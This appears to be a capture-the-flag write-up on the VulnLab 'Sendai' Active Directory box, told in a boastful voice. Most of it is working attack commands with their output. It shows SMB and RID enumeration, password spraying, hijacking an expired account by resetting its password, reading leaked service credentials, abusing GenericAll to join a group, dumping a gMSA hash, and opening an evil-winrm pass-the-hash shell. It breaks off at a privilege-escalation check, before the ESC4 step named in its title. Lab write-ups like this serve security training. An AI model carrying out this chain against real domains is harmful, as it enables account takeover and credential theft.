---
title: "Sendai Vulnlab| ESC4 & ReadGMSAPassword for AD Domination"
description: "And here we go again!🎭 Emerging from thedark shadows, it’s Maverick, back with anotherActive Directorymachine from VulnLab. This time, we’re sinking our teeth intoSendai, a box filled withreal-world A"
pubDate: 2025-03-05
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 26
coverImage: "https://cdn-images-1.medium.com/max/800/1*Dd4dKCEQXOOXPO8x0TfTzw.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*Dd4dKCEQXOOXPO8x0TfTzw.png)

### Sendai Vulnlab| ESC4 & ReadGMSAPassword for AD Domination

**And here we go again!** 🎭 Emerging from the **dark shadows**, it’s Maverick, back with another **Active Directory** machine from VulnLab. This time, we’re sinking our teeth into **Sendai**, a box filled with **real-world AD chaos** just waiting to be exploited. We’ve got **Active Directory Certificate Services (ESC4)**, some **sweet gMSA password abuse**, and, of course, **good ol’ SMB enumeration** to kick things off. **If you’ve been following my previous write-ups, you already know AD CS is a gift that keeps on giving.** Wanna see more **certificate-based destruction**? Go check out my last few write-ups. But for now, buckle up — this one’s packed with **fun, pwnage, and sysadmin tears.** 😈🔥

---

### Nmap Results Unmasking Sendai’s Open Doors

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai/nmap_results]  
└─# cat nmap_initial.txt  
# Nmap 7.94SVN scan initiated Wed Mar 5 01:31:20 2025 as: nmap -p- --min-rate 10000 -Pn -oN nmap_results/nmap_initial.txt 10.10.106.182  
Nmap scan report for 10.10.106.182  
Host is up (0.24s latency).  
Not shown: 65518 filtered tcp ports (no-response)  
PORT STATE SERVICE  
53/tcp open domain  
80/tcp open http  
88/tcp open kerberos-sec  
135/tcp open msrpc  
139/tcp open netbios-ssn  
389/tcp open ldap  
443/tcp open https  
445/tcp open microsoft-ds  
593/tcp open http-rpc-epmap  
3389/tcp open ms-wbt-server  
9389/tcp open adws  
49664/tcp open unknown  
49669/tcp open unknown  
64123/tcp open unknown  
64155/tcp open unknown  
64166/tcp open unknown  
64177/tcp open unknown  
  
# Nmap done at Wed Mar 5 01:31:49 2025 -- 1 IP address (1 host up) scanned in 29.62 seconds  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai/nmap_results]  
└─# cat nmap_detailed.txt  
# Nmap 7.94SVN scan initiated Wed Mar 5 01:31:49 2025 as: nmap -p 53,80,88,135,139,389,443,445,593,3389,9389,49664,49669,64123,64155,64166,64177 -sCV -Pn -oN nmap_results/nmap_detailed.txt 10.10.106.182  
Nmap scan report for 10.10.106.182  
Host is up (0.085s latency).  
  
PORT STATE SERVICE VERSION  
53/tcp open tcpwrapped  
80/tcp open tcpwrapped  
|_http-server-header: Microsoft-IIS/10.0  
88/tcp filtered kerberos-sec  
135/tcp open tcpwrapped  
139/tcp open tcpwrapped  
389/tcp filtered ldap  
443/tcp open tcpwrapped  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Subject Alternative Name: DNS:dc.sendai.vl  
| Not valid before: 2023-07-18T12:39:21  
|_Not valid after: 2024-07-18T00:00:00  
445/tcp filtered microsoft-ds  
593/tcp filtered http-rpc-epmap  
3389/tcp open tcpwrapped  
|_ssl-date: 2025-03-04T23:33:10+00:00; -1s from scanner time.  
| ssl-cert: Subject: commonName=dc.sendai.vl  
| Not valid before: 2025-03-03T23:30:42  
|_Not valid after: 2025-09-02T23:30:42  
9389/tcp filtered adws  
49664/tcp filtered unknown  
49669/tcp filtered unknown  
64123/tcp filtered unknown  
64155/tcp filtered unknown  
64166/tcp filtered unknown  
64177/tcp filtered unknown  
  
Host script results:  
|_clock-skew: -1s  
|_smb2-time: ERROR: Script execution failed (use -d to debug)  
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Wed Mar 5 01:33:17 2025 -- 1 IP address (1 host up) scanned in 88.66 seconds
```

As usual, we’ve got the **classic AD services** in the mix — **DNS, Kerberos, LDAP, SMB**, and so on. But come on, you already know what I’m gonna start with, right? **Of course, SMB!** 😆

I’ll be checking it out with **smbclient** and **nexexec**, but feel free to use whatever tools you have in your arsenal. **Pro tip:** If you want to level up your SMB enumeration game, I highly recommend reading [this ](https://0xdf.gitlab.io/cheatsheets/smb-enum#)**awesome SMB cheatsheet by 0xdf** it’s a goldmine!

> And before you ask, “Why didn’t you check ports 80 & 443?” — I did, alright? But there was nothing interesting there. No juicy admin panels, no forgotten backups, not even a spicy meme left by a lazy dev . Just a whole lot of boring . So, moving on to the real action SMB!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai/nmap_results]  
└─# nxc smb sendai.vl -u mav -p '' --shares  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\mav: (Guest)  
SMB 10.10.106.182 445 DC [*] Enumerated shares  
SMB 10.10.106.182 445 DC Share Permissions Remark  
SMB 10.10.106.182 445 DC ----- ----------- ------  
SMB 10.10.106.182 445 DC ADMIN$ Remote Admin  
SMB 10.10.106.182 445 DC C$ Default share  
SMB 10.10.106.182 445 DC config  
SMB 10.10.106.182 445 DC IPC$ READ Remote IPC  
SMB 10.10.106.182 445 DC NETLOGON Logon server share  
SMB 10.10.106.182 445 DC sendai READ company share  
SMB 10.10.106.182 445 DC SYSVOL Logon server share  
SMB 10.10.106.182 445 DC Users READ
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# smbclient //dc.sendai.vl/sendai -U ''  
Password for [WORKGROUP\]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Tue Jul 18 20:31:04 2023  
.. DHS 0 Wed Jul 19 17:11:25 2023  
hr D 0 Tue Jul 11 15:58:19 2023  
incident.txt A 1372 Tue Jul 18 20:34:15 2023  
it D 0 Tue Jul 18 16:16:46 2023  
legal D 0 Tue Jul 11 15:58:23 2023  
security D 0 Tue Jul 18 16:17:35 2023  
transfer D 0 Tue Jul 11 16:00:20 2023  
  
7309822 blocks of size 4096. 760513 blocks available  
smb: \> mget *  
Get file incident.txt?  
smb: \transfer\> ls  
. D 0 Tue Jul 11 16:00:20 2023  
.. D 0 Tue Jul 18 20:31:04 2023  
anthony.smith D 0 Tue Jul 11 15:59:50 2023  
clifford.davey D 0 Tue Jul 11 16:00:06 2023  
elliot.yates D 0 Tue Jul 11 15:59:26 2023  
lisa.williams D 0 Tue Jul 11 15:59:34 2023  
susan.harper D 0 Tue Jul 11 15:59:39 2023  
temp D 0 Tue Jul 11 16:00:16 2023  
thomas.powell D 0 Tue Jul 11 15:59:45 2023  
  
7309822 blocks of size 4096. 868659 blocks available
```

![](https://cdn-images-1.medium.com/max/1200/1*_tHwjYn5nbSi1P8KHOViFg.png)

*Ah yes, the classic ‘we have weak passwords but will change them soon’ message. 🤡 Spoiler alert: They didn’t. And I’m about to prove it.*

As you can see from **netexec** and **smbclient**, we can read both the **Users** and **Sendai** directories. Inside **Sendai**, we found an interesting message — something about **weak passwords** and a **plan to change them soon**. Translation? **We might have a window to exploit this before they lock things down!**

Meanwhile, in the **Transfer** directory, I found **some usernames** — gold for **building a user wordlist**. Why? Because we need to check which of these users are **valid for authentication**. And while we’re at it, let me drop some **pro tips**:

- If you have valid users, **always** consider trying **AS-REP roasting or Kerberoasting** this might be your golden ticket. Not this time? Still, add it to your **checklist** for every AD box you hack. ✅
- And, of course, there’s **password spraying** a classic.

Now, before jumping straight into spraying, I’ll **try RID brute-force** using **netexec** or **impacket-lookupsid** to grab even more usernames. More users = better chance of cracking a weak password.

Alright, enough talk **let’s go!**

#### RID Brute-Forcing

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai/nmap_results]  
└─# nxc smb sendai.vl -u 'sqlsvc' -p 'SurenessBlob85' --rid-brute 10000  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\sqlsvc:SurenessBlob85  
SMB 10.10.106.182 445 DC 498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.106.182 445 DC 500: SENDAI\Administrator (SidTypeUser)  
SMB 10.10.106.182 445 DC 501: SENDAI\Guest (SidTypeUser)  
SMB 10.10.106.182 445 DC 502: SENDAI\krbtgt (SidTypeUser)  
SMB 10.10.106.182 445 DC 512: SENDAI\Domain Admins (SidTypeGroup)  
SMB 10.10.106.182 445 DC 513: SENDAI\Domain Users (SidTypeGroup)  
SMB 10.10.106.182 445 DC 514: SENDAI\Domain Guests (SidTypeGroup)  
SMB 10.10.106.182 445 DC 515: SENDAI\Domain Computers (SidTypeGroup)  
SMB 10.10.106.182 445 DC 516: SENDAI\Domain Controllers (SidTypeGroup)  
SMB 10.10.106.182 445 DC 517: SENDAI\Cert Publishers (SidTypeAlias)  
SMB 10.10.106.182 445 DC 518: SENDAI\Schema Admins (SidTypeGroup)  
SMB 10.10.106.182 445 DC 519: SENDAI\Enterprise Admins (SidTypeGroup)  
SMB 10.10.106.182 445 DC 520: SENDAI\Group Policy Creator Owners (SidTypeGroup)  
SMB 10.10.106.182 445 DC 521: SENDAI\Read-only Domain Controllers (SidTypeGroup)  
SMB 10.10.106.182 445 DC 522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)  
SMB 10.10.106.182 445 DC 525: SENDAI\Protected Users (SidTypeGroup)  
SMB 10.10.106.182 445 DC 526: SENDAI\Key Admins (SidTypeGroup)  
SMB 10.10.106.182 445 DC 527: SENDAI\Enterprise Key Admins (SidTypeGroup)  
SMB 10.10.106.182 445 DC 553: SENDAI\RAS and IAS Servers (SidTypeAlias)  
SMB 10.10.106.182 445 DC 571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.106.182 445 DC 572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)  
SMB 10.10.106.182 445 DC 1000: SENDAI\DC$ (SidTypeUser)  
SMB 10.10.106.182 445 DC 1101: SENDAI\DnsAdmins (SidTypeAlias)  
SMB 10.10.106.182 445 DC 1102: SENDAI\DnsUpdateProxy (SidTypeGroup)  
SMB 10.10.106.182 445 DC 1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)  
SMB 10.10.106.182 445 DC 1104: SENDAI\sqlsvc (SidTypeUser)  
SMB 10.10.106.182 445 DC 1105: SENDAI\websvc (SidTypeUser)  
SMB 10.10.106.182 445 DC 1107: SENDAI\staff (SidTypeGroup)  
SMB 10.10.106.182 445 DC 1108: SENDAI\Dorothy.Jones (SidTypeUser)  
SMB 10.10.106.182 445 DC 1109: SENDAI\Kerry.Robinson (SidTypeUser)  
SMB 10.10.106.182 445 DC 1110: SENDAI\Naomi.Gardner (SidTypeUser)  
SMB 10.10.106.182 445 DC 1111: SENDAI\Anthony.Smith (SidTypeUser)  
SMB 10.10.106.182 445 DC 1112: SENDAI\Susan.Harper (SidTypeUser)  
SMB 10.10.106.182 445 DC 1113: SENDAI\Stephen.Simpson (SidTypeUser)  
SMB 10.10.106.182 445 DC 1114: SENDAI\Marie.Gallagher (SidTypeUser)  
SMB 10.10.106.182 445 DC 1115: SENDAI\Kathleen.Kelly (SidTypeUser)  
SMB 10.10.106.182 445 DC 1116: SENDAI\Norman.Baxter (SidTypeUser)  
SMB 10.10.106.182 445 DC 1117: SENDAI\Jason.Brady (SidTypeUser)  
SMB 10.10.106.182 445 DC 1118: SENDAI\Elliot.Yates (SidTypeUser)  
SMB 10.10.106.182 445 DC 1119: SENDAI\Malcolm.Smith (SidTypeUser)  
SMB 10.10.106.182 445 DC 1120: SENDAI\Lisa.Williams (SidTypeUser)  
SMB 10.10.106.182 445 DC 1121: SENDAI\Ross.Sullivan (SidTypeUser)  
SMB 10.10.106.182 445 DC 1122: SENDAI\Clifford.Davey (SidTypeUser)  
SMB 10.10.106.182 445 DC 1123: SENDAI\Declan.Jenkins (SidTypeUser)  
SMB 10.10.106.182 445 DC 1124: SENDAI\Lawrence.Grant (SidTypeUser)  
SMB 10.10.106.182 445 DC 1125: SENDAI\Leslie.Johnson (SidTypeUser)  
SMB 10.10.106.182 445 DC 1126: SENDAI\Megan.Edwards (SidTypeUser)  
SMB 10.10.106.182 445 DC 1127: SENDAI\Thomas.Powell (SidTypeUser)  
SMB 10.10.106.182 445 DC 1128: SENDAI\ca-operators (SidTypeGroup)  
SMB 10.10.106.182 445 DC 1129: SENDAI\admsvc (SidTypeGroup)  
SMB 10.10.106.182 445 DC 1130: SENDAI\mgtsvc$ (SidTypeUser)  
SMB 10.10.106.182 445 DC 1131: SENDAI\support (SidTypeGroup)
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# impacket-lookupsid guest@10.10.106.182 10000 | grep 'SidTypeUser' | sed 's/RETRO\\//g' | awk '{print $2}' > clean_users.txt  
Password:  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# cat clean_users.txt  
SENDAI\Administrator  
SENDAI\Guest  
SENDAI\krbtgt  
SENDAI\DC$  
SENDAI\sqlsvc  
SENDAI\websvc  
SENDAI\Dorothy.Jones  
SENDAI\Kerry.Robinson  
SENDAI\Naomi.Gardner  
SENDAI\Anthony.Smith  
SENDAI\Susan.Harper  
SENDAI\Stephen.Simpson  
SENDAI\Marie.Gallagher  
SENDAI\Kathleen.Kelly  
SENDAI\Norman.Baxter  
SENDAI\Jason.Brady  
SENDAI\Elliot.Yates  
SENDAI\Malcolm.Smith  
SENDAI\Lisa.Williams  
SENDAI\Ross.Sullivan  
SENDAI\Clifford.Davey  
SENDAI\Declan.Jenkins  
SENDAI\Lawrence.Grant  
SENDAI\Leslie.Johnson  
SENDAI\Megan.Edwards  
SENDAI\Thomas.Powell  
SENDAI\mgtsvc$  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# cat clean_users.txt | cut -d '\' -f2 > users.txt  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# cat users.txt  
Administrator  
Guest  
krbtgt  
DC$  
sqlsvc  
websvc  
Dorothy.Jones  
Kerry.Robinson  
Naomi.Gardner  
Anthony.Smith  
Susan.Harper  
Stephen.Simpson  
Marie.Gallagher  
Kathleen.Kelly  
Norman.Baxter  
Jason.Brady  
Elliot.Yates  
Malcolm.Smith  
Lisa.Williams  
Ross.Sullivan  
Clifford.Davey  
Declan.Jenkins  
Lawrence.Grant  
Leslie.Johnson  
Megan.Edwards  
Thomas.Powell  
mgtsvc$
```

Now that we’ve got a **solid user list**, it’s time for the fun part — **password spraying!** 🔥 Let’s see if any of these accounts are rocking those **weak, predictable passwords**. Because, let’s be real, **someone always does**

Firing up **NetExec**, and let’s start knocking on some doors.

#### Password Spraying with NetExec

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc smb sendai.vl -u users.txt -p '' --continue-on-success  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [+] sendai.vl\Guest:  
SMB 10.10.106.182 445 DC [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\DC$: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\websvc: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE ⬅️⬅️⬅️⬅️  
SMB 10.10.106.182 445 DC [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE  
SMB 10.10.106.182 445 DC [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE ⬅️⬅️⬅️⬅️  
SMB 10.10.106.182 445 DC [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE
```

And **here we go again!** We hit **STATUS_PASSWORD_MUST_CHANGE**, which means **game on!** This tells us that these users — **Thomas.Powell** and **Elliot.Yates** must update their passwords before logging in. And guess what? **We can do it for them.**

Time to **reset one of these passwords** and see just how much trouble we can cause. Let’s find out what kind of access they have! 🔥 I’ll be using the **smbpasswd tool from Impacket** to make the switch because why break in when they let you walk through the front door?

**🔑 Changing Thomas.Powell’s Password**

```bash
┌──(root㉿kali)-[/opt/impacket/examples]  
└─# ./smbpasswd.py sendai.vl/Thomas.Powell@dc.sendai.vl -newpass '$mav1234'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
===============================================================================  
Warning: This functionality will be deprecated in the next Impacket version  
===============================================================================  
  
Current SMB password:  
[!] Password is expired, trying to bind with a null session.  
[*] Password was changed successfully.
```

Now that we’ve **changed Thomas.Powell’s password**, it’s time to **validate** if it actually works. No point in resetting a password if it leads to a dead end, right? 😆

First, I’ll **check SMB shares** using the new credentials — because if he has access to some juicy shares, we might just hit the jackpot. 🎰

> 💡 Pro Tips:

> Whenever you get valid credentials , don’t stop at SMB — always check if the user has access to other services like MSSQL, RDP, WinRM, LDAP, and more . You never know where those creds might open doors. 🚪🔓

> You can also use valid creds for enumerating a ton of things , such as:

> Users & groups (local and domain)

> Checking group memberships (like who’s in Domain Admins )

> Listing local administrator groups

> Finding misconfigured permissions that can lead to privilege escalation 🔥

> Always check for common AD vulnerabilities like:

> PrinterBug (Spooler service abuse for NTLM relay)

> PetitPotam (NTLM relay attack via MS-EFSRPC)

> AD CS misconfigurations (ESC1–ESC8)

> Check the domain’s password policy (e.g., lockout threshold, complexity rules) before spraying to avoid account lockouts. 🚨

> Other juicy misconfigs that could lead to full domain takeover 😈

> Check the “description” field in AD sometimes admins accidentally leave passwords or useful hints there. 🎯🔑

Alright, time to test and see what we’ve unlocked! 🔥

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc smb sendai.vl -u 'thomas.powell' -p '$mav1234'  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\thomas.powell:$mav1234  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc smb sendai.vl -u 'thomas.powell' -p '$mav1234' --shares  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\thomas.powell:$mav1234  
SMB 10.10.106.182 445 DC [*] Enumerated shares  
SMB 10.10.106.182 445 DC Share Permissions Remark  
SMB 10.10.106.182 445 DC ----- ----------- ------  
SMB 10.10.106.182 445 DC ADMIN$ Remote Admin  
SMB 10.10.106.182 445 DC C$ Default share  
SMB 10.10.106.182 445 DC config READ,WRITE  
SMB 10.10.106.182 445 DC IPC$ READ Remote IPC  
SMB 10.10.106.182 445 DC NETLOGON READ Logon server share  
SMB 10.10.106.182 445 DC sendai READ,WRITE company share  
SMB 10.10.106.182 445 DC SYSVOL READ Logon server share  
SMB 10.10.106.182 445 DC Users READ
```

Boom! 💥 In Thomas.Powell’s **shared files**, there’s a new directory called **“Config”** and guess what? Inside, we found a **.sqlconfig** file.

And inside that file? **Credentials for the sql_svc user!** 😈 Looks like someone forgot to keep their secrets… well, secret. 🔥

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# cat .sqlconfig  
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=-------------;
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc smb sendai.vl -u 'sqlsvc' -p '-------redacted'  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\sqlsvc:S-------
```

Nice! ✅ The **sql_svc** credentials are **valid**, and guess what? We’ve got a **foothold ??but but but in usual if you find something like that offcourse you will try to login to mssql and if you have not good permmsion you could creating silver ticket and login to enable xp_cmdshell and in this time you could see something like serimpersonate privielge and you will abuse this with any potato exploit this scnarion i did last writeup and there is also AV thatt i bypassed it with hoaxshell reverseshell this is another attack path okay i will not doing it caus i already did it last writeup**

Back again with the **sql_svc** valid credentials! 🎯

Alright, time to **fire up BloodHound-Python (CE version)** 🐺 and **map out the entire domain**. Running the **Community Edition (CE) version** ensures we get the **latest updated edges** in BloodHound, giving us the most accurate attack paths.

Let’s see what juicy **attack vectors** we can uncover! 😈🔥

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# bloodhound-ce-python -u sqlsvc -p '--------' -c all -dc dc.sendai.vl -d sendai.vl -ns 10.10.106.182  
  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: sendai.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.sendai.vl  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.sendai.vl  
INFO: Found 27 users  
INFO: Found 57 groups  
INFO: Found 2 gpos  
INFO: Found 5 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.sendai.vl  
INFO: Done in 00M 16S
```

![](https://cdn-images-1.medium.com/max/800/1*xQrl1QtQGxKrDdEDmZeA4Q.png)

*love that really 😉*

Thomas.Powell is part of the **Support Group**, which holds **GenericAll** permissions over the **ADMSVC Group**. This means we can add Thomas to **ADMSVC**, granting him its privileges.

Now, the **ADMSVC Group** has **ReadGMSAPassword** permissions over the **MGTSVC$ account**, allowing us to retrieve its **NThash**. With that, we’re one step closer to escalating privileges! 😈🔥

![](https://cdn-images-1.medium.com/max/800/1*DW8Nsc0IGeiObOcaa8938w.png)

### Step 1: Adding Thomas.Powell to ADMSVC Group

To exploit **ReadGMSAPassword** on **MGTSVC$**, we first need to add **Thomas.Powell** to the **ADMSVC group** since it already has the required permissions.

Once added, we’ll be able to retrieve the **MGTSVC$ account’s password** and move forward with privilege escalation!

I **love** [BloodyAD](https://github.com/CravateRouge/bloodyAD), and you should too! This Swiss Army knife of AD exploitation lets us automate privilege abuse **like a boss**.

With **BloodyAD**, we can easily:
✅ Add **Thomas.Powell** to **ADMSV**

```bash
└─# python3 /opt/Arsenal/bloodyAD/bloodyAD.py --host 10.10.106.182 -d sendai.vl -u thomas.powell -p '$mav1234' add groupMember ADMSVC thomas.powell  
  
[+] thomas.powell added to ADMSVC
```

### Step 2:Reading the GMSA Password for MGTSVC$

Now that **Thomas.Powell** is in the **ADMSVC group**, we can **extract the MGTSVC$ password** using **GMSADumper** or **NetExec**.

I’ll use **both tools** to show you different ways to get the password — because why settle for one method when we can flex both?

Let’s dump that **sweet, sweet** GMSA password!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# python3 /opt/Arsenal/gMSADumper/gMSADumper.py -u 'thomas.powell' -p '$mav1234' -d sendai.vl -l 10.10.106.182  
Users or groups who can read password for mgtsvc$:  
> admsvc  
mgtsvc$:::aa8b20a6026c-------------------  
mgtsvc$:aes256-cts-hmac-sha1-96:8a2e9cc171c6482003aa082a7165---------------------------  
mgtsvc$:aes128-cts-hmac-sha1-96:e2d7925-------------------
```

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc ldap sendai.vl -u 'thomas.powell' -p '$mav1234' --gmsa  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
LDAPS 10.10.106.182 636 DC [+] sendai.vl\thomas.powell:$mav1234  
LDAPS 10.10.106.182 636 DC [*] Getting GMSA Passwords  
LDAPS 10.10.106.182 636 DC Account: mgtsvc$
```

### WinRM Access with MGTSVC$ — Living Off the Land!

Now, if we validate the **MGTSVC$ hash**, we’ll see that it’s **valid for authentication**. And guess what? We can use it to log in via **WinRM** meaning **we’re officially living off the land, bruh!**

Time to leverage this access and see what **damage** we can do from inside! 🃏

![](https://cdn-images-1.medium.com/max/800/0*ekkdtELAWU-OXYBO.gif)

*And just like that, the domain map is ours! 🃏 BloodHound never disappoints — let’s see what misconfigurations we can exploit. Time to connect the dots and unleash chaos! 😈🔥*

### Privilege Escalation Time! 🚀

Now what? **It’s time to go BIG** with **privilege escalation!** 🔥

As you know, there are some **must-have** tools for **Windows privilege escalation**, including:
 ✅ **WinPEAS** — The classic Windows privilege escalation script 🦚
 ✅ [**PrivCheck** ](https://github.com/itm4n/PrivescCheck)— Another solid enumeration tool
 ✅ And for research? **Big shoutout to “**[**itm4n**](https://x.com/itm4n)**”**, one of the best Windows security researchers out there! His blog is a **goldmine** of privilege escalation techniques. 🏆

Let’s **run some checks** and see what **misconfigurations** we can abuse! 😈

```powershell
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# evil-winrm -i sendai.vl -u mgtsvc$ -H aa8b20a6026-------------------  
  
Evil-WinRM shell v3.5  
  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== =======  
SeMachineAccountPrivilege Add workstations to domain Enabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> whoami /all  
  
USER INFORMATION  
----------------  
  
User Name SID  
============== ============================================  
sendai\mgtsvc$ S-1-5-21-3085872742-570972823-736764132-1130  
  
  
GROUP INFORMATION  
-----------------  
  
Group Name Type SID Attributes  
=========================================== ================ =========================================== ==================================================  
SENDAI\Domain Computers Group S-1-5-21-3085872742-570972823-736764132-515 Mandatory group, Enabled by default, Enabled group  
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group  
BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448  
  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name Description State  
============================= ============================== =======  
SeMachineAccountPrivilege Add workstations to domain Enabled  
SeChangeNotifyPrivilege Bypass traverse checking Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
  
  
USER CLAIMS INFORMATION
```

```powershell
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> .\PrivescCheck.ps1  
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Import-Module .\PrivescCheck.ps1  
*Evil-WinRM* PS C:\Users\mgtsvc$\documents> Invoke-PrivescCheck  
